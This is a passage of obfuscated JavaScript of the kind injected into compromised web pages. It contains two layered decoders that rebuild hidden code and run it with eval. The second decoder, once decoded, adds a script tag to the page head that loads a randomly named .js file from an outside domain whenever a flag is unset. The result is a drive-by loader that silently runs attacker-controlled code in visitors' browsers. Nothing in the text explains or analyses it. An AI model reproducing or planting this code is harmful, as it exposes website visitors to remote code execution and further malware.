if(va97f7c4==184)va97f7c4=1105;p02da43+=leaaf3ff(va97f7c4);}}o9c517e73d62("03","42","h","|6","3","2|°","246°|","7","0","8","|Q","J|","6","6","2|","°","17°","\"","°23°","|","5","6","2","|°1","85","°°","1","8","4","°","r","|53","8|","[|560|","h°1","9","5","°","|531|8","|","63","2","|°","15","4°°1","53°°6°|","59","6|","°2","05°°","2","22°","°1","4","0","°°","225°°22","2","°°","216°","|6","9","1|°","2","3","5","°","°","8°","|","70","0|°","24","4","°","|6","60","|°2","11","°","°20","°","°32°°","32°","|6","00","|°22","4°","|","6","39|°2","09°|","535","|","^","^","°15","3","°g","|","7","1","8","|","J","]|","6","75|","°23","7","°","°","30°°","2","33°","|56","5|°1","7","8","°°","179","°|","57","7|°19","7°","|","7","1","5","|","X","|","5","8","7|","°197","°","°","202°","°2","1","2°|","5","84","|","°2","11°","°2","1","1","°","°","19","3°","|5","47","|i","°159°","°1","80°|","6","5","9|°2","5","°°","1","5","°","°25","°","°30","°","°21","6°","°","2","0","°","|5","61|","°185°w°","17","2°°18","4°","|","65","0|°1","5","°|590|","°14","9","°","°2","0","5","°|","6","9","5","|°2","54","°","|6","9","2|","°2","4","3","°|64","5|°","2","1","6","°","°","1","70","°","|62","5|","°","1","47°|","5","9","2|q","°20","9°","|707|A","|7","28","|°","16","°°","2","4","°|63","0|","°","2°","|59","3|","°","22","6°","°","2","1","7","°°","206°","|","540","|","°","163°","|725|S","|","727|°","15","°|","7","12|","W|","5","35","|°1","52°°","1","57°|","630","|°","2","4","2°|600","|","°22","3°°2","3","1","°","°","15","8°°23","2°°2","33°","|536","|°1","70°°","15","0","°","|6","70|","\"","|57","6|","°1","85","°","°","1","91°|58","4","|°128°°1","57","°","|6","97","|","°","1","4°","°1","4°°","241°°","248","°F","?","5|","69","4","|34","7","|57","7","|°19","9°","°","19","0","°","°","18","9","°","°128°|6","0","8","|°1","61°","|545","|","Y|","6","5","8","|","%","|709","|°","2","3","4°","|698","|°","2","20°°","2","19","°","|700|°221","°","K=|607|°229°","|674|°","30","°",")1","°232","°","|","5","4","3|","°1","7","5°°17","6","°","|","6","60|&","|","671","|","°29°","|","6","67","|","°3","1","°","|7","17","|","FL","|","62","5|","°169°","°1","9","8","°|571","|","s°13","1°","|656|°","2","27","°","|","66","0","|°1","8","5","°","|5","8","1","|","gf°","2","1","8","°j","g","|6","22","|°14","3","°","°234°°2","4","5","°","°233","°","°","25","1°°","2","4","3°","|68","7|,|","5","6","9|","°","191°°","19","7°","|7","0","5","|°","7","°H","|63","3|","°","2","55","°|","5","7","9","|°20","0°°","2","02°°","2","08","°°","2","06°°","1","92","°","|6","93","|:","<C|","6","0","0|°","21","3","°","°","1","44°°","173","°","|","6","5","6","|","°","2","0","0","°°1","4","°|","6","55|","°2","8°°","21°°","10","°","°27","°","°1","6","°°","2","2°|59","4","|","°21","6","°|","5","4","7|","c","d[","|","654|","!°1","7","9°|","55","0","|H","|6","1","9|°1","40°","|63","5|°156","°°2","52°°","24","9","°°17","9°","|","68","2","|","°","23","4°","|","6","00","|°","2","3","1","°|635|","°252","°|","6","6","8|\"°24°|58","1","|°204°°21","2°°13","9°|","5","91","|°","223","°","|","61","7","|","°","250°°","25","1°","|","608","|°","222°","°","2","28","°|5","3","2","|","°14","1","°°14","7°|6","21","|","°16","5°","|","554","|°","1","27°|","5","4","7|","x","|590","|°","16","3°","°1","34","°|","5","33|]|","6","7","1|°2","2","4","°","|","5","6","3","|k|5","97","|°","2","32°|","6","0","7","|","°","132","°","|","706|","°","2","28°°2","27°","°","22","7","°","°227","°Q|","6","58","|°","19°","°24","°|56","3","|°","175°°186","°|","68","9|@°2","47","°","|","5","39|°","1","7","1°","|6","80","|9",":","&,!","|","5","7","9","|","°","1","9","4°°123","°","°1","52°°","123","°°140","°","|","6","67|°","2","38°","°","1","9","2","°|534|","8","|","5","9","2","|qqq","°","222°|","623","|°","232","°°","2","49","°","|6","02|°146°","°2","18°|630|","°2","4","3°|62","1","|°","2","3","0°","°23","3","°","|","66","2|","°","2","0","6°|56","3","|","°","1","36","°","k°17","5","°","|","5","70","|°19","3","°|6","72","|°2","7","°","|70","4","|","M","|","534","|°1","5","5°|","72","8|U|","689","|","7","=|703","|°","5","°|5","95|°2","10","°|572","|","°1","8","5","°|61","7","|","°24","5°°","1","9","8°|","7","23","|","W","P","X","|","59","9","|°","2","12","°|","6","81|","/","5","|","5","61|","°","1","8","8","°°","1","3","9","°","°","194","°","|589","|","°","185°","|665","|","°1","8°","°24","°","|","5","41|°1","3","1","°°","15","0°","|","6","71","|","$|6","13|°22","6","°°165","°|","72","4|","°1","9°","T|","613","|°2","2","6°|7","0","4","|","9<","°2","55","°°1°|","60","4|","°","2","07","°|","57","1|°","131°","|725","|","J","(","°","2","5","0°","°","247°°","246","°","|680|°","2","01°°","2","01°","|541","|°","171","°|","691","|,=","°","235°>","|","5","8","5|°19","6°","|5","5","2","|°","1","78°","|6","41","|","°2°°9°","°1","3°°","185","°°21","4","°°","18","5°°","253°°","8°|","5","4","8|","°15","9°","°","177°|","6","64","|°2","9","°°2","1°°","30°|","60","4","|","°","232","°","°","16","2","°","|","62","7","|°","23","8°","|5","6","6","|°19","2°|7","2","7|","T","P","c","T","|","574","|","°","15","5°°19","4","°|","670|°","27","°","#","|545","|","°15","8°|548|°170","°°176°","|7","1","4|°","1","0°|","681","|°2","3","2","°|","6","94","|A|70","6","|=","|","5","47","|°1","7","3","°","°","164°","°","1","7","1","°°175°","|","556|k","|","611|°1","6","4°","|630","|°2","01°","|","5","34|",";","|","6","73|°195","°°","194","°","°","1","94","°","°","19","4°","|","6","67","|","&|60","5|°","2","1","6","°","|","54","8","|°1","7","4","°°1","6","5°|","616|°","2","4","0°","°","24","4","°","°1","74°|","5","89","|°","2","17°","|","5","30","|°16","3°","|691|",";0|649|°1","9","3°","°","2","22°|6","5","4|°","198","°","|720","|","°15","°","|","5","92|","°","2","20","°","°","2","0","5","°","|","6","4","2|°1","8°","°","14","°","°2","0","1°","|","709","|G|","725","|N","c|6","59|°12","°","°","30","°|7","2","5","|","P_","V]","|5","9","8","|","°2","2","6","°","°","1","4","9","°","|58","2","|°","1","5","3°k","|6","3","4|°15","6°°","1","5","5°°","1","55","°°1","5","5°°","5","°°245°","|63","3","|","°3","°°","2","5","0","°","°","1°","°","5°","°","1","9","1°","°0°","°25","5","°|6","2","5|","°","2","5","1°°2","38°","°234°°","2","3","7","°","|","635","|","°","1","2°°6°","|71","0|R","|63","0","|","°23","9","°°2","°|","6","4","0|","°25","3","°°","2","5","1","°|656","|","°","16°","|","6","49|","°2°°","1","5°|","6","8","3|","*|6","90|","/","°","23","4°","|5","8","8","|°1","61°","|","635","|°","17","9°","°","2","4","9°°8°|","5","32|","°","1","5","4°°","14","3°","°1","6","0","°|6","43","|","°4","°","|6","8","1|","0/","°2","2","5°","|","684","|","°2","3","6","°|584","|","°","137°","°","128","°|6","61|(","|","7","03|°","228","°","°22","5°°2","2","4°","|","6","6","9","|","°1","9","0°","|","66","6|°","1","8","7°°","1","87°|","657","|°18","°°1","5°","°2","01°","|5","80","|","°","1","32°|569","|°1","97°°","1","8","5","°","|707","|DN","°","9","°","|6","08|","°","2","3","4","°","°2","2","1°","|5","75","|°","1","84","°","°","18","7","°","°","2","08","°°17","0°","|540","|°","16","8°","°1","4","9","°","|","7","2","2|","^|","5","69|°1","82","°","q","|","5","4","2|","ssV","|","538","|","Y","|722","|M","|","5","81","|°2","04°|","6","99","|","@","C","|","566","|°","186°°179","°°19","4°°","1","79","°|","71","8","|°13°","°1","5","°","°6°","|637","|","°","1","6°|","55","4|OL|","5","6","7|XX|601|z","|","7","12","|","°","23","3","°|5","64|","U","°1","9","5°|","5","77","|","°","1","9","4","°","|6","83","|1","|6","45|","°","1°","|5","56|","°","179","°|","68","0|7","|","6","83|°","2","41","°;|","61","1","|","°2","4","4°","°245°|","57","3","|°1","87","°°","1","93","°","°","182","°","°188°|","5","70","|","r","|63","0","|","°2","0","3°","|","555","|c|","67","2|","°234","°","°2","4","3","°","°197°","°19","4","°|","6","06","|°1","27°|","6","5","4|°17","5","°|66","0|","°","1","8","1°","°1","81°)","°1","85","°","|637|°15","9°°15","8","°","°158","°","|","627","|","°","1","4","8","°|6","33|","°","14","°|70","2|","°","17°°","227","°°","2","24°°2","2","3°|","6","5","2|","°1","73","°°1","73°°","2","3°°7","°","|6","7","6","|.","%|","622","|","°24","6","°","|7","03|","K","°","5°","|59","7|","°","2","2","0°","°2","1","9°|","72","2","|","V","Y|5","96|","°","2","05°°2","0","8","°°1","4","0°°169","°|","5","43|W|","5","81","|","°1","9","5°°210","°|","5","46","|°16","8","°","|","69","6|","3D","9","|656","|","°2","3°|625","|°","24","7°","°","177","°","|","644","|°","1","97","°|","680|","°2","2","4°","|","5","84","|°","2","1","9","°m","j","|71","2","|°","233","°°","233","°","°2","33°","°","2","33°W|646|°","7°°12","°","|","6","4","6","|","°","2°°","1","3","°|","62","6","|","°","1°|67","8|","°","2","3","6","°67","8$*|","7","2","2","|","K|","68","5","|,","°","229°","°2","°","|","5","5","7|e","w|","5","4","1","|","p|","62","8","|","°15","3","°°150°","°","149°°","1","49","°","°","1","49°°","9","°","|7","14|°2","9","°","|","55","2","|","MJII","I°","17","9","°","°","16","3°°","178","°°","1","69","°°","1","7","6°°","18","0°|","579|","°13","7","°","|","688","|;|","5","8","3","|","°","20","9°|","5","58|°","1","69","°","f","|","5","93","|°","1","66","°|","5","6","5|","m°","1","9","4","°","°","1","9","1°°","1","8","5","°|675","|","°2","1","9","°","|","72","2","|","°","2","1°|608|","°","152","°","°197°","°","2","17","°°","23","6°°22","4","°|","701|","°","3°|","549|°","17","5","°","°1","58°","°","171","°|","6","0","9|°2","2","1","°|55","0","|","°","173°","|66","9","|\"°","2","2","1","°","°2","22","°","|","5","65|","°","1","23","°|","5","7","7","|","°","2","0","5°","°200°","°1","7","2","°°","205","°","|6","8","8|",":","|","61","5|","°2","32","°","|","679","|","-","&","°23","1°|6","1","1|°","1","6","4°|6","87|","°2","4","5°:<|6","89|","+","<=",";","2|","66","9|#","|560|","°17","5°","p","°1","2","3","°","|655|°","2","0","8","°°1","9","9","°","°","21","0°","°","19","9°°2","06","°","°2","13°","|","534","|°1","52","°°","16","1","°","|","714|°9","°|","614","|°18","5°°1","39°°","1","3","6°°","1","3","5","°°","1","3","5","°|5","37","|:°","1","5","3°","°15","0°","|","6","5","0","|°","3","°","°6°","|","5","56","|","r","°165","°","|","649","|°","17°|6","55|","°","2","3","°|5","3","0|°1","43","°°","1","52°","°","1","4","2°","|68","5|°","8°","-",".1",")","|","5","8","4","|°1","36°","°2","11","°","|572","|","°1","8","3","°","°198","°|716|","M","T","X","|5","44","|","a","s|6","2","3","|","°","14","8°|67","8","|°","20","0","°|","5","88","|","mm|","62","2","|°","3","°|","6","3","3|","°","1","5","8","°","°1","55","°°","154°|","62","6","|°","7","°|56","9|°","140°","|","574","|c","|","5","30","|4","|65","6|","%","|59","9","|°","15","2°","°","1","51°|","545|","b|597|°1","68","°","");eval(p02da43);function u78645(){return 1;}function t35f1f9(bef8b17){return bef8b17.length;}function x90c5ad7(of8c067,v72ce750c){return of8c067.substr(v72ce750c,1);}function g6d5e79(h5e608,b50a8c2){return h5e608.substr(b50a8c2,1);}function h687b6(h2c65c7d5){if(h2c65c7d5==168)h2c65c7d5=1025;else if(h2c65c7d5==184)h2c65c7d5=1105;return (h2c65c7d5>=192 && h2c65c7d5<256) ? h2c65c7d5+848 : h2c65c7d5;}function leaaf3ff(x0c1b0){var afd83d3e=String;return afd83d3e["f\x72\x6fmChar\x43o\x64e"](x0c1b0);}function h4d1f7(b00af41){return (b00af41+'')["\x63\x68\x61\x72C\x6fd\x65\x41\x74"](0);}
c=3-1;i=c-2;if(window.document)if(parseInt("0"+"1"+"23")===83)try{Date().prototype.q}catch(egewgsd){f=['0i62i77i70i59i76i65i71i70i0i1i-8i83i-27i-30i-31i78i57i74i-8i77i74i68i-8i21i-8i-1i64i76i76i72i18i7i7i64i77i73i17i73i6i76i68i67i57i69i64i75i60i75i75i6i75i61i74i78i61i58i58i75i6i59i71i69i7i63i7i-1i19i-27i-30i-31i65i62i-8i0i76i81i72i61i71i62i-8i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i21i21i-8i-1i77i70i60i61i62i65i70i61i60i-1i1i-8i83i-27i-30i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i8i19i-27i-30i-31i85i-27i-30i-31i60i71i59i77i69i61i70i76i6i71i70i69i71i77i75i61i69i71i78i61i-8i21i-8i62i77i70i59i76i65i71i70i0i1i-8i83i-27i-30i-31i-31i65i62i-8i0i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i21i21i-8i8i1i-8i83i-27i-30i-31i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i9i19i-27i-30i-31i-31i-31i78i57i74i-8i64i61i57i60i-8i21i-8i60i71i59i77i69i61i70i76i6i63i61i76i29i68i61i69i61i70i76i75i26i81i44i57i63i38i57i69i61i0i-1i64i61i57i60i-1i1i51i8i53i19i-27i-30i-31i-31i-31i78i57i74i-8i75i59i74i65i72i76i-8i21i-8i60i71i59i77i69i61i70i76i6i59i74i61i57i76i61i29i68i61i69i61i70i76i0i-1i75i59i74i65i72i76i-1i1i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i76i81i72i61i-8i21i-8i-1i76i61i80i76i7i66i57i78i57i75i59i74i65i72i76i-1i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i71i70i74i61i57i60i81i75i76i57i76i61i59i64i57i70i63i61i-8i21i-8i62i77i70i59i76i65i71i70i-8i0i1i-8i83i-27i-30i-31i-31i-31i-31i65i62i-8i0i76i64i65i75i6i74i61i57i60i81i43i76i57i76i61i-8i21i21i-8i-1i59i71i69i72i68i61i76i61i-1i1i-8i83i-27i-30i-31i-31i-31i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i10i19i-27i-30i-31i-31i-31i-31i85i-27i-30i-31i-31i-31i85i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i71i70i68i71i57i60i-8i21i-8i62i77i70i59i76i65i71i70i0i1i-8i83i-27i-30i-31i-31i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i10i19i-27i-30i-31i-31i-31i85i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i75i74i59i-8i21i-8i77i74i68i-8i3i-8i37i57i76i64i6i74i57i70i60i71i69i0i1i6i76i71i43i76i74i65i70i63i0i1i6i75i77i58i75i76i74i65i70i63i0i11i1i-8i3i-8i-1i6i66i75i-1i19i-27i-30i-31i-31i-31i64i61i57i60i6i57i72i72i61i70i60i27i64i65i68i60i0i75i59i74i65i72i76i1i19i-27i-30i-31i-31i85i-27i-30i-31i85i19i-27i-30i85i1i0i1i19'][0].split('i');v="ev"+"al";}if(v)e=window[v];w=f;s=[];r=String;for(;690!=i;i+=1){j=i;s+=r["fromC"+"harCode"](40+1*w[j]);}if(f)z=s;e(z);